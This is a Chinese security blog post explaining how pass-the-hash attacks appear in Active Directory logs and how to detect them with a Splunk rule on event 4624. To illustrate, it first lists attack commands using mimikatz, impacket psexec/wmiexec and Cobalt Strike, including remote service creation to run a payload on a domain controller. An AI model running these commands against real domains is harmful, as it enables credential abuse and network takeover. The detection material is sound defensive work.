---
title: 基于AD Event日志检测哈希传递攻击
url: https://www.secpulse.com/archives/193527.html
source: 安全脉搏
date: 2022-12-15
fetch_date: 2025-10-04T01:31:01.084603
---

# 基于AD Event日志检测哈希传递攻击

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 基于AD Event日志检测哈希传递攻击

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[Bypass007](https://www.secpulse.com/newpage/author?author_id=6275)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2022-12-14

9,225

**01、简介**

哈希传递攻击是基于NTLM认证的一种攻击方式，当我们获得某个管理员用户的密码哈希值，就可以利用密码哈希值进行横向渗透。

在域环境中，只有域管理员的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。基于AD Event日志如何检测哈希传递攻击，这个就是我们今天探讨的话题。

**02、哈希传递攻击实例**

**（1）使用mimikatz 进行哈希传递获取域控权限**

在域环境中，当我们获得了域管理员的NTLM哈希值，我们就可以访问域内任何一台服务器。

```
 #提权
 privilege::debug
 #使用域管理员bypassu拍卖行及的NTLM值进行哈希传递攻击
 sekurlsa::pth /user:bypass /domain:evil.com /ntlm:44f077e27f6fef69e7bd834c7242b040
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-1671001645.png)

利用PsExec.exe来远程登录和执行命令

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-16710016451.png)

**（2）使用lmpacket工具包进行哈希传递获取域控权限**

lmpacket工具包集成了多个脚本，可用来进行哈希传递，如psexec.py、wmiexec.py。

```
psexec.py  -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219
wmiexec.py -hashes 00000000000000000000000000000000:44f077e27f6fef69e7bd834c7242b040 bypass@192.168.44.219
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-1671001646.png)

**(3) 通过Cobalt strike进行pth横向获取域控权限**

在已上线的机器中，使用先前获取的hash对目标域控进行哈希传递攻击，获取域控权限。

哈希传递

```
pth evilbypass 44f077e27f6fef69e7bd834c7242b040
shell dir \192.168.44.219c$
```

获取系统权限

```
shell copy  C:UsersadministratorDesktopartifact.exe \192.168.44.219c$
shell sc \192.168.44.219 create test binpath=C:artifact.exe
shell sc \192.168.44.219 start test
shell sc \192.168.44.219 delete test
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-1671001647.png)

**03、哈希传递攻击检测**

哈希传递攻击的检测其实是比较困难的，因为它总是和正常的访问行为非常类似，我们需要从域控收集的大量的安全日志中找到需要关心的事件和具体的值。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-1671001648.png)

分析：在使用NTLM凭证进行横向获取域控权限时，域控的日志中会记录4624登录事件，LogonType为3且登录进程为NtlmSsp，这里可以找到登录用户和登录源地址。为了能从正常的访问行为中，找出异常登录行为，我们可以设置白名单，将域控管理员和正常登录来源IP添加至白名单，关注关键用户的登录行为，排除干扰项。另外，当攻击者使用工具进行哈希传递的时候，比如使用psexec.py脚本进行哈希传递会同时产生多条LogonType为3且登录进程为NtlmSsp的日志，我们还可以将登录频率作为判断依据进行检测。

安全规则示例：

```
eventtype=wineventlog_security   EventCode=4624   LogonProcessName=NtLmSsp   match_user!="*$"    src!="-"  match_user IN("administrator","bypass") | eval time=_time | bin time span=30m   | stats  count earliest(_time) AS start_time latest(_time) AS end_time values(src) as val_src  by time match_user  dest   | eval  start_time=strftime(start_time,"%F %T"),end_time=strftime(end_time,"%F %T")  | search count >5  | nomv val_src | eval message="在"+start_time+"到"+end_time+"时间内，域控服务器:"+dest +" 疑似遭受哈希传递攻击"+count+"次, 操作账号:"+match_user+" 操作来源ip:"+val_src
| table  start_time   end_time  match_user message  count val_src  dest
```

告警效果如下图：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-193527-1671001651.png)

**本文作者：[Bypass007](newpage/author?author_id=6275)**

**本文为安全脉搏专栏作者发布，转载请注明：**[**https://www.secpulse.com/archives/193527.html**](https://www.secpulse.com/archives/193527.html)

Tags: [AD Event日志](https://www.secpulse.com/archives/tag/ad-event%E6%97%A5%E5%BF%97)、[mimikatz](https://www.secpulse.com/archives/tag/mimikatz)、[哈希](https://www.secpulse.com/archives/tag/%E5%93%88%E5%B8%8C)

点赞：
5
[评论：0](#goComment)
收藏：
0

*新浪微博
QQ空间
微信扫一扫*

### 相关文章

* [![基于AD Event日志监测AdminSDHolder](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2023/02/1675840696859-300x178.png)

  基于AD Event日志监测AdminS…](https://www.secpulse.com/archives/195575.html "详细阅读 基于AD Event日志监测AdminSDHolder")
* [![基于AD Event日志检测LSASS凭证窃取攻击](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/12/1669961994099.png)

  基于AD Event日志检测LSASS凭…](https://www.secpulse.com/archives/192703.html "详细阅读 基于AD Event日志检测LSASS凭证窃取攻击")
* [![第五届安洵杯 WriteUp by Mini-Venom](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2022/11/1669711389996-300x165.png)

  第五届安洵杯 WriteUp by Mi…](https://www.secpulse.com/archives/192546.html "详细阅读 第五届安洵杯 WriteUp by Mini-Venom")

评论  (0)

昵称

必填
您当前尚未登录。
[登录？](https://www.secpulse.com/user_login "登录")
[注册](https://www.secpulse.com/user-register)

邮箱

必填（保密）

快来写下你的想法吧！

upload

|  |  |  |
| --- | --- | --- |
| [![]( https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/2018/03/535dc13ea81e426db897effda78f9aac-290x290.png)](https://www.secpulse.com/newpage/author?author_id=6275aaa) | [Bypass007 ![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)](https://www.secpulse.com/newpage/author?author_id=6275) | |
| 文章数：94 | 积分： 218 |
| 一个网络安全爱好者，对技术有着偏执狂一样的追求。 | |

* [![阿波罗主机安全管理](/wp-content/themes/secpulse2017/img/product-agent.png)](https://linkage.duoyinsu.com)
* [![伏特漏洞扫描云平台](/wp-content/themes/secpulse2017/img/product-fute.png)](https://v.duoyinsu.com)

### 安全问答社区

![安全问答社区](https://www.secpulse.com/wp-content/themes/secpulse2017/img/xcx.png)

### 脉搏官方公众号

![脉搏公众号](https://www.secpulse.com/wp-content/themes/secpulse2017/img/SecPulse.png)

### 活动日程

[显示更多](https://www.secpulse.com/newpage/activity)

#### 2022-06-17

[Gdevops 全球敏捷运维峰会](https://www.bagevent.com/event/8022600?bag_track=AQMB)

#### 2022-05-12

[Mastering the Challenge！——来自The 3rd AutoCS 2022智能汽车信息安全大会的邀请函](https://autocs2022.artisan-event.com/)

#### 2021-11-18

[AutoSW 2021智能汽车软件开发大会](https://autosw2021.artisan-event.com)

#### 2021-06-27

[2021中国国际网络安全博览会暨高峰论坛](http://www.sins-expo.com)

#### 2021-05-27

[The 2nd AutoCS 2021智能汽车信息安全大会](https://artisan-event.com/AutoCS2021/)

#### 2020-12-18

[贝壳找房2020 ICS安全技术峰会](https://www.4hou.com/tickets/bmZO)
...